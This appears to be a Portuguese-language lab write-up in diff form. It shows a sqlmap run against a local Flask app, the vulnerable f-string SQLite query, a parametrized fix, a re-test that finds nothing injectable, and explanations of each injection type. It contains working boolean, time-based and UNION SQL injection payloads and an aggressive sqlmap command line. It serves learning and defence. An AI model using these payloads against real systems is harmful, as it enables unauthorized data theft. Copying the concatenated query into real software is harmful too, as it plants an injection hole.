@@ -1,0 +1,125 @@
+[*] starting @ 18:14:31 /2025-04-23/
+
+[18:14:31] [INFO] testing connection to the target URL
+[18:14:31] [INFO] checking if the target is protected by some kind of WAF/IPS
+[18:14:31] [INFO] testing if the target URL content is stable
+[18:14:32] [INFO] target URL content is stable
+[18:14:32] [INFO] testing if POST parameter 'termo' is dynamic
+[18:14:32] [WARNING] POST parameter 'termo' does not appear to be dynamic
+[18:14:32] [WARNING] heuristic (basic) test shows that POST parameter 'termo' might not be injectable
+[18:14:32] [INFO] testing for SQL injection on POST parameter 'termo'
+[18:14:32] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[18:14:33] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[18:14:33] [INFO] POST parameter 'termo' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --string="lolo")
+[18:14:34] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' 
+it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+[18:14:34] [INFO] testing 'Generic inline queries'
+[18:14:34] [INFO] testing 'SQLite inline queries'
+[18:14:34] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
+[18:14:34] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
+[18:14:34] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
+[18:14:34] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'
+[18:15:34] [INFO] POST parameter 'termo' appears to be 'SQLite > 2.0 OR time-based blind (heavy query)' injectable 
+[18:15:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[18:15:34] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[18:15:34] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[18:15:34] [INFO] target URL appears to have 3 columns in query
+[18:15:34] [INFO] POST parameter 'termo' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+[18:15:34] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+POST parameter 'termo' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 153 HTTP(s) requests:
+---
+Parameter: termo (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: termo=-1984' OR 4854=4854-- kNSS
+
+    Type: time-based blind
+    Title: SQLite > 2.0 OR time-based blind (heavy query)
+    Payload: termo=teste' OR 6220=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- UCAp
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: termo=teste' UNION ALL SELECT NULL,NULL,CHAR(113,112,107,98,113)||CHAR(108,117,115,108,117,120,108,118,69,72,70,84,98,80,78,102,68,114,115,115,109,75,106,111,104,113,78,87,88,122,101,78,74,79,86,73,72,72,83,90)||CHAR(113,107,107,118,113)-- HxrG
+---
+[18:15:34] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[18:15:34] [INFO] fetched data logged to text files under '/home/kiri/.local/share/sqlmap/output/127.0.0.1'
+[18:15:34] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 18:15:34 /2025-04-23/
+
+
+query = f"SELECT nome, profissao, salario FROM pessoas WHERE nome LIKE '%{termo}%'"
+c.execute(query)
+
+
+Essa linha é vulnerável, porque concatena diretamente a entrada do usuário (termo) com a string SQL — abrindo espaço para injeção.
+
+Versão segura com parametrização
+
+@app.route('/consulta', methods=['POST'])
+def consulta():
+    termo = request.form.get('termo')
+    conn = sqlite3.connect('banco.db')
+    c = conn.cursor()
+    try:
+        c.execute("SELECT nome, profissao, salario FROM pessoas WHERE nome LIKE ?", ('%' + termo + '%',))
+        resultados = c.fetchall()
+    except Exception as e:
+        resultados = [("Erro", str(e), "")]
+    conn.close()
+    return render_template('index.html', resultados=resultados)
+
+
+Recomendações extras:
+Validação de entrada: verifique se termo não está vazio ou muito longo.
+
+Sanitização opcional: você pode usar html.escape(termo) se for exibir isso em HTML.
+
+Logs: registre os acessos às consultas para rastrear abusos.
+
+
+1. Boolean-based blind
+termo=-1984' OR 4854=4854-- 
+O banco retorna resultados baseados em condições booleanas sempre verdadeiras.
+
+2. Time-based blind
+termo=teste' OR 6220=LIKE(CHAR(...),UPPER(HEX(RANDOMBLOB(...))))-- 
+Um ataque que depende do tempo de resposta para inferir se a injeção teve sucesso.
+
+
+3. UNION-based
+termo=teste' UNION ALL SELECT NULL,NULL,CHAR(...)-- 
+Injetou uma nova consulta UNION para extrair dados arbitrários.
+
+sqlmap -u "http://127.0.0.1:5000/consulta" --data="termo=teste" --batch --level=5 --risk=3 --flush-session
+
+
+[18:30:34] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
+[18:30:35] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
+[18:30:35] [WARNING] parameter 'Host' does not seem to be injectable
+[18:30:35] [CRITICAL] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
+[18:30:35] [WARNING] HTTP error codes detected during run:
+400 (Bad Request) - 655 times
+
+ Pontos principais que foram explorados:
+Falta de parametrização da query:
+
+A linha vulnerável query = f"SELECT ..." concatena direto o input com a SQL, o que permite a injeção.
+
+Tipos de SQL Injection:
+
+Boolean-based blind → extrai info com base em respostas diferentes.
+
+Time-based blind → força o banco a demorar pra responder, revelando sucesso da injeção.
+
+Union-based → injeta uma segunda consulta para extrair dados diretamente.
+
+Detecção do DBMS (SQLite):
+
+Isso permitiu ao sqlmap usar payloads específicos, mais eficazes.
+
+Confirmação de vulnerabilidade com payloads reais:
+
+Mostrou como o input malicioso se comporta e extraiu dados com sucesso.
